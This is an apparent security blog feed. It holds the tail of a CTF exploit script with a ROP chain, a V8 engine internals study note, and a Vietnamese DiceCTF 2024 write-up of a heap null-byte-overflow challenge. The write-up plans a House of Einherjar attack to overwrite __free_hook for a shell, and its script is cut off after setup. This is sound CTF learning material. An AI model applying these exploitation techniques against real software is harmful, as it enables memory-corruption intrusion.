</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&gt; &#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;1&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>pl <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;1280|&#39;</span>
</span></span><span style="display:flex;"><span>pl <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x65737341203A2928</span>) <span style="color:#f92672">//</span> magic
</span></span><span style="display:flex;"><span>pl <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x30</span>
</span></span><span style="display:flex;"><span>pl <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x4025A1</span>)
</span></span><span style="display:flex;"><span>pl <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;X&#39;</span><span style="color:#f92672">*</span>(<span style="color:#ae81ff">1284</span> <span style="color:#f92672">-</span> len(pl))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>import_module(pl)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>rop <span style="color:#f92672">=</span> ROP(libc)
</span></span><span style="display:flex;"><span>rop<span style="color:#f92672">.</span>read(<span style="color:#ae81ff">3</span>, libc<span style="color:#f92672">.</span>bss(), <span style="color:#ae81ff">0x100</span>)
</span></span><span style="display:flex;"><span>rop<span style="color:#f92672">.</span>write(<span style="color:#ae81ff">1</span>, libc<span style="color:#f92672">.</span>bss(), <span style="color:#ae81ff">0x100</span>)
</span></span><span style="display:flex;"><span>pl <span style="color:#f92672">=</span> <span style="color:#ae81ff">24</span><span style="color:#f92672">*</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span>
</span></span><span style="display:flex;"><span>pl <span style="color:#f92672">+=</span> bytes(rop)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(pl)
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>interactive()
</span></span></code></pre></div><h1 id="references">References</h1>
<p><a href="https://learn.microsoft.com/en-us/cpp/c-runtime-library/reference/system-wsystem?view=msvc-170">https://learn.microsoft.com/en-us/cpp/c-runtime-library/reference/system-wsystem?view=msvc-170</a></p>
<p><a href="https://schlafwandler.github.io/posts/attacking-wine-part-i/">https://schlafwandler.github.io/posts/attacking-wine-part-i/</a></p>
<p><a href="https://github.com/Nautilus-Institute/quals-2024/tree/main">https://github.com/Nautilus-Institute/quals-2024/tree/main</a></p>
<p><a href="https://www.pcre.org/">https://www.pcre.org/</a></p>
<p><a href="https://github.com/PCRE2Project/pcre2">https://github.com/PCRE2Project/pcre2</a></p>
<p><a href="https://wiki.winehq.org/Wine_Developer%27s_Guide/Debugging_Wine">https://wiki.winehq.org/Wine_Developer%27s_Guide/Debugging_Wine</a></p>
<p><a href="https://learn.microsoft.com/en-us/cpp/c-runtime-library/reference/get-errno?view=msvc-170">https://learn.microsoft.com/en-us/cpp/c-runtime-library/reference/get-errno?view=msvc-170</a></p>
<p><a href="https://learn.microsoft.com/en-us/cpp/c-runtime-library/errno-constants?view=msvc-170">https://learn.microsoft.com/en-us/cpp/c-runtime-library/errno-constants?view=msvc-170</a></p>
]]></description>
      
    </item>
    
    
    
    <item>
      <title>V8 note</title>
      <link>https://w1n-gl0ry.github.io/posts/v8_note/</link>
      <pubDate>Mon, 15 Apr 2024 17:37:11 +0800</pubDate>
      
      <guid>https://w1n-gl0ry.github.io/posts/v8_note/</guid>
      <description><![CDATA[<h2 id="v8-note">V8 note</h2>
<h2 id="c-intro">C++ Intro</h2>
<h3 id="v8">V8</h3>
<ul>
<li>Google&rsquo;s open source JavaScript engine</li>
<li>Used for interpret and execute JS code</li>
<li>Implemented in C++</li>
<li>Parse JS code, construct AST, JIT compiled AST into assembly for execution</li>
</ul>
<p><img src="https://hackmd.io/_uploads/S1HHRcmeA.png" alt="image"></p>
<h3 id="compiler-and-optimization-for-v8">Compiler and optimization for v8</h3>
<ul>
<li>Have 4 internal compilers</li>
<li>The old baseline compiler: Full-Codegen.</li>
<li>The old optimizing compiler: Crankshaft.</li>
<li>The new optimizing compiler: TurboFan.</li>
<li>The new baseline compiler: Ignition.</li>
</ul>
<p><img src="https://hackmd.io/_uploads/Hk3XrB2yR.png" alt="image"></p>
<h3 id="compiler-history">Compiler History</h3>
<ul>
<li>Full-Codegen : directly generates and executes assembly language from AST</li>
</ul>
<p>=&gt; It is relatively fast, but the generated assembly language code has many redundant parts and there is room for optimization.</p>
<ul>
<li>Crankshaft : was introduced in 2010 to optimize code.</li>
</ul>
<p><img src="https://hackmd.io/_uploads/rJecIB2JR.png" alt="image"></p>
<ul>
<li>
<p>TurboFan : was introduced in 2015 to better adapt to the new JavaScript specification.
<img src="https://hackmd.io/_uploads/rkd6Irn1C.png" alt="image"></p>
</li>
<li>
<p>Ignition : introduced in 2017, which generates intermediate language (bytecode)</p>
</li>
</ul>
<p><img src="https://hackmd.io/_uploads/ry2mwrnyC.png" alt="image"></p>
<ul>
<li>Since 2018, Full-Codegen and Crankshaft have been removed from v8.</li>
</ul>
<p><img src="https://hackmd.io/_uploads/SkaHDH3J0.png" alt="image"></p>
<h3 id="abstract-syntax-tree">Abstract syntax tree</h3>
<p><img src="https://hackmd.io/_uploads/ry0Kwr210.png" alt="image"></p>
<h3 id="compiler--optimization">Compiler &amp;&amp; Optimization</h3>
<ul>
<li>
<p>Baseline compiler : Full-Codege</p>
</li>
<li>
<p>Optimization mechanism : Hidden Class, Inline Caching</p>
</li>
<li>
<p>Optimizing compiler: Crankshaft, TurboFan</p>
</li>
<li>
<p>TurboFan</p>
<p><img src="https://hackmd.io/_uploads/r1b2nH21C.png" alt="image"></p>
</li>
<li>
<p>Optimization mechanisms</p>
<ul>
<li>Optimization 1: Cache usage
<ul>
<li>Hidden Class
<ul>
<li>The value of each property is managed in the form of an array</li>
</ul>
</li>
<li>Inline Caching</li>
</ul>
</li>
<li>Optimization 2: Recompile to more efficient JIT code
<ul>
<li>Crankshaft</li>
<li>TurboFan</li>
<li>Optimization goals are determined at runtime</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="hidden-class">Hidden Class</h4>
<ul>
<li>properties can easily be added or removed from an object after its instantiation
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">car</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span>(<span style="color:#a6e22e">make</span>,<span style="color:#a6e22e">model</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">make</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">make</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">model</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">model</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">myCar</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">car</span>(<span style="color:#a6e22e">honda</span>,<span style="color:#a6e22e">accord</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">myCar</span>.<span style="color:#a6e22e">year</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">2005</span>;
</span></span></code></pre></div></li>
</ul>
<p>=&gt; Slower than orther languages</p>
<ul>
<li>
<p>Once the new function is declared, Javascript will create hidden class C0.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">Point</span>(<span style="color:#a6e22e">x</span>,<span style="color:#a6e22e">y</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">x</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">x</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">y</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">y</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">obj</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Point</span>(<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">2</span>);
</span></span></code></pre></div><p><img src="https://hackmd.io/_uploads/r1LW_LhJC.png" alt="image"></p>
</li>
<li>
<p>Once the first statement “this.x = x” is executed, V8 will create a second hidden class called C1 that is based on C0</p>
<p><img src="https://hackmd.io/_uploads/SJRRdU31C.png" alt="image"></p>
</li>
</ul>
<p>=&gt; Everytime a new property is added to an object, the objects old hidden class is updated with a transition path to the new hidden class</p>
<ul>
<li>
<p>This process is repeated when the statement “this.y = y” is executed</p>
<p><img src="https://hackmd.io/_uploads/H1PrYIh10.png" alt="image"></p>
</li>
<li>
<p>Hidden class transitions are dependent on the order in which properties are added to an object</p>
<p><img src="https://hackmd.io/_uploads/r12pY82k0.png" alt="image"></p>
</li>
</ul>
<h4 id="inline-caching-future">Inline Caching (future)</h4>
<h4 id="garbage-collection-future">Garbage Collection (future)</h4>
<h2 id="build-v8">Build V8</h2>
<ul>
<li>
<p>depot_tools</p>
<pre tabindex="0"><code>git clone https://chromium.googlesource.com/chromium/tools/depot_tools.git
vim /etc/profile
Add `export PATH=$PATH:&#34;/path/to/depot_tools&#34;` to `.profile`
cd /depot_tools &amp;&amp; ./gclient
</code></pre></li>
<li>
<p>ninja</p>
<pre tabindex="0"><code>git clone https://github.com/ninja-build/ninja.git
cd ninja &amp;&amp; ./configure.py --bootstrap &amp;&amp; cd ..
vim /etc/profile
Add `export PATH=$PATH:&#34;/path/to/ninja&#34;` to `.profile`
source /etc/profile
</code></pre></li>
<li>
<p>v8 source code</p>
<pre tabindex="0"><code>fetch v8
</code></pre></li>
<li>
<p>patch &amp; compile debug version</p>
<pre tabindex="0"><code>cd v8
# git checkout ???
git reset --hard +hash
gclient sync

#apply patch
git apply &lt; &#34;path/to/tctf.diff&#34;

tools/dev/v8gen.py x64.debug
ninja -C out.gn/x64.debug
#the result is in /out.gn/x64.debug/d8
#./tools/dev/gm.py x64.debug
</code></pre></li>
<li>
<p>Build with natives_blob.bin and snapshot_blob.bin</p>
<pre tabindex="0"><code>v8_static_library = true
v8_use_snapshot = true
v8_use_external_startup_data = true
</code></pre></li>
<li>
<p>add gdb extension</p>
<pre tabindex="0"><code>source /path/to/v8/tools/gdbinit
source /path/to/v8/tools/gdb-v8-support.py
</code></pre></li>
<li>
<p>Debug</p>
<pre tabindex="0"><code>%DebugPrint(a);
%SystemBreak(); 
%CollectGarbage(); # trigger garbage collection
%OptimizeFunctionOnNextCall(); # force JIT compilation of a function
</code></pre></li>
<li>
<p>Use native syntax</p>
<pre tabindex="0"><code>--trace-turbo
--trace-opt
--trace-deopt
--trace-turbo-reduction
</code></pre></li>
</ul>
<h2 id="v8-datatypes">V8 datatypes</h2>
<h3 id="values">Values</h3>
<ul>
<li>
<p>dynamically typed language</p>
</li>
<li>
<p>accomplished through a combination of pointer tagging and the use of dedicated type information objects, called Maps.</p>
</li>
<li>
<p>JS data types in v8 are listed in &ldquo;src/object.h&rdquo;</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c++" data-lang="c++"><span style="display:flex;"><span><span style="color:#75715e">// Inheritance hierarchy:
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// - Object
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">//   - Smi          (immediate small integer)
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">//   - HeapObject   (superclass for everything allocated in the heap)
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">//     - JSReceiver  (suitable for property access)
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">//       - JSObject
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">//         - JSArray
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">//         - JSArrayBuffer
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">//         - JSArrayBufferView
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">//           - JSTypedArray
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">//           - JSDataView
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">//         - JSBoundFunction
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">//         - JSCollection
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">//           - JSSet
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">//           - JSMap
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">//         - JSStringIterator
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">//         - JSSetIterator
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">//         - JSMapIterator
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">//         - JSWeakCollection
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">//           - JSWeakMap
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">//           - JSWeakSet
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">//         - JSRegExp
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">//         - JSFunction
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">//         - JSGeneratorObject
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">//         - JSGlobalObject
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">//         - JSGlobalProxy
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">//         - JSValue
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">//           - JSDate
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">//         - JSMessageObject
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">//         - JSModuleNamespace
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">//         - JSV8BreakIterator     // If V8_INTL_SUPPORT enabled.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>...
</span></span></code></pre></div></li>
<li>
<p>Notice: A JavaScript value is then represented as a tagged pointer of static type Object*</p>
<ul>
<li>On 32-bit archs:</li>
</ul>
<pre tabindex="0"><code>    // Formats of Object::ptr_:
//  Smi:        [31 bit signed int] 0
//  HeapObject: [32 bit direct pointer] (4 byte aligned) | 01
</code></pre><ul>
<li>On 64-bit archs:</li>
</ul>
<pre tabindex="0"><code>    Smi:        [32 bit signed int] [31 bits unused] 0
    HeapObject: [64 bit direct pointer]            | 01
</code></pre><p>=&gt; All accesses to data members of a HeapObject have to go through special accessors that take care of clearing the LSB.</p>
</li>
</ul>
<h3 id="maps">Maps</h3>
<ul>
<li>
<p>key data structure in v8, containing information such as:</p>
<ul>
<li>The dynamic type of the object, i.e. String, Uint8Array, HeapNumber, &hellip;</li>
<li>The size of the object in bytes</li>
<li>The properties of the object and where they are stored</li>
<li>The type of the array elements, e.g. unboxed doubles or tagged pointers</li>
<li>The prototype of the object if any</li>
</ul>
</li>
<li>
<p>In general there are three different regions in which property values can be stored:</p>
<ol>
<li>inside the object itself (&ldquo;inline properties&rdquo;)</li>
<li>dynamically sized heap buffer (&ldquo;out-of-line properties&rdquo;)</li>
<li>if the property name is an integer index [4], as array elements in a dynamically-sized heap array</li>
</ol>
</li>
</ul>
<ul>
<li>
<p>In 1 &amp; 2, the Map will store the slot number of the property value while in the last case the slot number is the element index.</p>
</li>
<li>
<p>Example:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span>    <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">o1</span> <span style="color:#f92672">=</span> {<span style="color:#a6e22e">a</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">42</span>, <span style="color:#a6e22e">b</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">43</span>};
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">o2</span> <span style="color:#f92672">=</span> {<span style="color:#a6e22e">a</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">1337</span>, <span style="color:#a6e22e">b</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">1338</span>};
</span></span></code></pre></div><ul>
<li>There will be two JSObjects and one map in memory : <br>
<img src="https://hackmd.io/_uploads/rydOqtXxR.png" alt="image"></li>
</ul>
<p>=&gt; The Map mechanism is also essential for garbage collection: when the collector processes an allocation (a HeapObject), it can immediately retrieve information such as the object&rsquo;s size and whether the object contains any other tagged pointers that need to be scanned by inspecting the Map.</p>
</li>
</ul>
<h3 id="smi">SMI</h3>
<ul>
<li>
<p>31-bit signed integer (max: 0xFFFFFFFE)</p>
</li>
<li>
<p>if pass around the number &gt; 31-bit singed integer, V8 has to create a box: the number is turned into a double, an object is created and the double is put inside of it.</p>
<p><img src="https://hackmd.io/_uploads/S1w4J9meA.png" alt="image"></p>
</li>
</ul>
<h3 id="objects">Objects</h3>
<ul>
<li>
<p>An object is a collection of properties: key-value pairs</p>
<p><img src="https://hackmd.io/_uploads/Sy_Ayq7x0.png" alt="image"></p>
</li>
<li>
<p>When an object &lsquo;obj&rsquo; is created, V8 creates a new JS Object and allocates memory for it. The value of &lsquo;obj&rsquo; is the pointer to this JS Object.</p>
<p><img src="https://hackmd.io/_uploads/By6ngq7eA.png" alt="image"></p>
</li>
<li>
<p>A JS Object is composed of:</p>
<ul>
<li>Map: a pointer to the hidden class the object belongs to.</li>
<li>Properties: a pointer to an object containing named properties. Properties added after initialization of the object are added to the Properties store.</li>
<li>Elements: a pointer to an object containing numbered properties.</li>
<li>In-Object Properties/Fast properties: pointers to named properties defined at object initialization. The number of in-objects properties depend on the object.</li>
</ul>
<p><img src="https://hackmd.io/_uploads/ry5Tl97gC.png" alt="image"></p>
<p><img src="https://hackmd.io/_uploads/By4vWqQgA.png" alt="image"></p>
</li>
</ul>
<h3 id="properties">Properties</h3>
<ul>
<li>
<p>JavaScript objects can have arbitrary properties associated with them. The names of object properties (or keys) can contain any character and are always strings. Any name used as a property key that is not a string is stringified via .toString() method. Thus, obj[&ldquo;1&rdquo;] and obj[1] are equal.</p>
<ul>
<li>numbered (or indexed) properties</li>
<li>named properties</li>
</ul>
</li>
</ul>
<h3 id="elements-numbered-properties">Elements: numbered properties</h3>
<ul>
<li>If the property key is a non-negative integer (0, 1, 2, etc), the property will be stored in the &ldquo;Elements&rdquo; object. These properties are called elements.</li>
</ul>
<h4 id="elements-kind">Elements kind</h4>
<p><code>const a = [1, 2, 3];</code></p>
<ul>
<li>
<p>The elements kind of the array &lsquo;a&rsquo; is PACKED_SMI_ELEMENTS.</p>
</li>
<li>
<p>When adding a floating-point number to the same array, V8 changes its elements kind to PACKED_DOUBLE_ELEMENTS.</p>
</li>
<li>
<p>When adding a string literal to the same array, V8 changes again its elements kind to PACKED_ELEMENTS.</p>
<pre tabindex="0"><code>const a = [1, 2, 3];    // elements kind: PACKED_SMI_ELEMENTS
a.push(4.5);            // elements kind: PACKED_DOUBLE_ELEMENTS
a.push(&#39;a&#39;);            // elements kind: PACKED_ELEMENTS
</code></pre></li>
</ul>
<h3 id="named-properties">Named properties</h3>
<ul>
<li>
<p>If the property key is not a non-negative integer, the property will be stored as an Inline-Object Property or in the &ldquo;Properties&rdquo; object.</p>
</li>
<li>
<p>The Properties store is an object that can be either a Fixed Array or a Dictionary.</p>
</li>
</ul>
<h4 id="fast-properties">Fast properties</h4>
<ul>
<li>When the number of properties is low, the Properties store is defined as an Array by V8.</li>
</ul>
<p><img src="https://hackmd.io/_uploads/SJoep5mlC.png" alt="image"></p>
<h4 id="slow-properties">Slow properties</h4>
<ul>
<li>However, if many properties get added and deleted from an object, it can result in significant time and memory overhead to maintain the descriptor array and hidden classes.</li>
</ul>
<p><img src="https://hackmd.io/_uploads/B1xWTq7eA.png" alt="image"></p>
<h3 id="primitive-types">Primitive Types</h3>
<h4 id="number">Number</h4>
<p><img src="https://hackmd.io/_uploads/SJCvq9mx0.png" alt="image"></p>
<ul>
<li>&lsquo;a&rsquo; is directly stored in the memory as a SMI.</li>
</ul>
<p><img src="https://hackmd.io/_uploads/BkFs557x0.png" alt="image"></p>
<ul>
<li>variable &lsquo;b&rsquo; is a pointer that points to a Map with the type *_NUMBER_TYPE.</li>
</ul>
<h4 id="strings">Strings</h4>
<p><img src="https://hackmd.io/_uploads/H14R95QxC.png" alt="image"></p>
<ul>
<li>A string variable points to a Map with the type *_STRING_TYPE.</li>
</ul>
<h4 id="boolean">Boolean</h4>
<p><img src="https://hackmd.io/_uploads/HJ4ej5Xl0.png" alt="image"></p>
<ul>
<li>A boolean variable points to a Map with the type ODDBALL_TYPE.</li>
</ul>
<h4 id="symbols">Symbols</h4>
<p><img src="https://hackmd.io/_uploads/rkkGjcQlC.png" alt="image"></p>
<ul>
<li>A symbol variable points to a Symbol structure.</li>
</ul>
<h4 id="undefined">Undefined</h4>
<p><img src="https://hackmd.io/_uploads/rklSjqmlA.png" alt="image"></p>
<ul>
<li>An undefined variable points to a Map with type ODDBALL_TYPE.</li>
</ul>
<h4 id="null">Null</h4>
<p><img src="https://hackmd.io/_uploads/H1xYj9QlC.png" alt="image"></p>
<ul>
<li>
<p>A null variable points to a map with type ODDBALL_TYPE.</p>
</li>
<li>
<p>In Javascript, the memory management is done by V8 and its garbage collector.</p>
</li>
</ul>
<h2 id="turbofan---the-optimizing-compiler-inside-v8-future">TurboFan - The optimizing compiler inside V8 (future)</h2>
<h2 id="jit-future">JIT (future)</h2>
<h2 id="v8-heap-sandbox">V8 Heap Sandbox</h2>
<h2 id="references">References</h2>
<p><a href="https://juejin.cn/post/6844903937787559944">https://juejin.cn/post/6844903937787559944</a></p>
]]></description>
      
    </item>
    
    
    
    <item>
      <title>DICE-CTF 2024 Writeups</title>
      <link>https://w1n-gl0ry.github.io/posts/dice-ctf/</link>
      <pubDate>Fri, 02 Feb 2024 17:37:11 +0800</pubDate>
      
      <guid>https://w1n-gl0ry.github.io/posts/dice-ctf/</guid>
      <description><![CDATA[<h1 id="lời-nói-đầu">Lời nói đầu</h1>
<p>Tuần cuối cùng của năm 2023, mình quyết định kết thúc năm 2023 này với giải DiceCTF. Sau đây là writeups của 1 số bài mình làm được trong suốt giải.</p>
<h1 id="pwn---babytalk">Pwn - babytalk</h1>
<h2 id="source-code-overview">Source code overview</h2>
<ul>
<li>Đây là bài đầu tiên mình làm trong giải, và có vẻ là 1 challenge về Heap khá dễ thở.</li>
<li>Challenge dưới dạng tệp ELF 64-bit, full-mitigations, có 4 chức năng</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">╭─</span> <span style="color:#960050;background-color:#1e0010"></span> <span style="color:#960050;background-color:#1e0010"></span> <span style="color:#960050;background-color:#1e0010"></span> <span style="color:#f92672">~/</span>CTF<span style="color:#f92672">/</span>Pwnable<span style="color:#f92672">/</span><span style="color:#ae81ff">2024</span><span style="color:#f92672">/</span>dicectf<span style="color:#f92672">/</span>baby<span style="color:#f92672">-</span>talk <span style="color:#960050;background-color:#1e0010"></span>                                                                                                             <span style="color:#960050;background-color:#1e0010"></span> <span style="color:#960050;background-color:#1e0010">✔</span> <span style="color:#960050;background-color:#1e0010"></span> w1n_gl0ry<span style="color:#960050;background-color:#1e0010">@</span>phis1Ng <span style="color:#960050;background-color:#1e0010">─╮</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">╰─</span> .<span style="color:#f92672">/</span>chall_patched                                                                                                                                                                  <span style="color:#960050;background-color:#1e0010">─╯</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1.</span> str
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">2.</span> tok
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">3.</span> del
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">4.</span> exit
</span></span><span style="display:flex;"><span><span style="color:#f92672">&gt;</span> 
</span></span></code></pre></div><p>Thoạt nhìn qua 3 chức năng <code>do_str</code>, <code>do_tok</code>, <code>do_del</code> thì không thấy bug gì cả. Chúng ta có thể allocate qua malloc, strtok, free.</p>
<h2 id="solution">Solution</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">do_tok</span>(<span style="color:#66d9ef">void</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;idx? &#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> idx <span style="color:#f92672">=</span> <span style="color:#a6e22e">get_num</span>();
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (idx <span style="color:#f92672">&gt;=</span> ARR_SIZE) {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;too big!&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>str <span style="color:#f92672">=</span> strs[idx];
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (str <span style="color:#f92672">==</span> NULL) {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;empty!&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;delim? &#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> delim[<span style="color:#ae81ff">2</span>];
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">read</span>(STDIN_FILENO, delim, <span style="color:#66d9ef">sizeof</span>(delim));
</span></span><span style="display:flex;"><span>    delim[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;\0&#39;</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>tok <span style="color:#f92672">=</span> <span style="color:#a6e22e">strtok</span>(str, delim); tok <span style="color:#f92672">!=</span> NULL; tok <span style="color:#f92672">=</span> <span style="color:#a6e22e">strtok</span>(NULL, delim)) {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">puts</span>(tok);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Hàm <code>strtok()</code> chia 1 string thành chuỗi NULL hoặc là 1 chuỗi token. Nếu tìm thấy delimiter byte đã được chỉ định, nó sẽ được ghi đè bởi NULL byte để kết thúc chuỗi.</p>
<p><code>The strtok() function breaks a string into a sequence of zero or more nonempty tokens.  On the first call to strtok(), the string to be parsed should be specified in str.  In each subsequent call that should parse the same string, str must be NULL.</code></p>
<p>Ở hàm <code>do_str()</code>, khi cấp phát và nhập nội dung thì nó sẽ đọc chính xác số kí tự theo size đã được chỉ định và không kết thúc chuỗi bằng NULL byte.
Do đó, ta có thể lấp đầy heap.</p>
<p><img src="https://hackmd.io/_uploads/rJcByhPo6.png" alt="image"></p>
<p>Bây giờ ta gọi hàm <code>do_tok()</code> và chỉ định delimiter byte là byte đầu tiên của trường size của chunk kế tiếp, ta sẽ trigger được null byte overflow.</p>
<p><img src="https://hackmd.io/_uploads/r12VeNuoT.png" alt="image"></p>
<p>Đến đây, mình khá là tà đạo nên sẽ sử dụng kĩ thuật House of einherjar để ghi đè <code>__free_hook</code> và get shell.</p>
<h2 id="solve-script">Solve Script</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>LOCAL:
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">=</span>process(<span style="color:#e6db74">&#39;./chall_patched&#39;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>GDB:
</span></span><span style="display:flex;"><span>        cmd<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&#34;&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        init-pwndbg
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        &#34;&#34;&#34;</span>
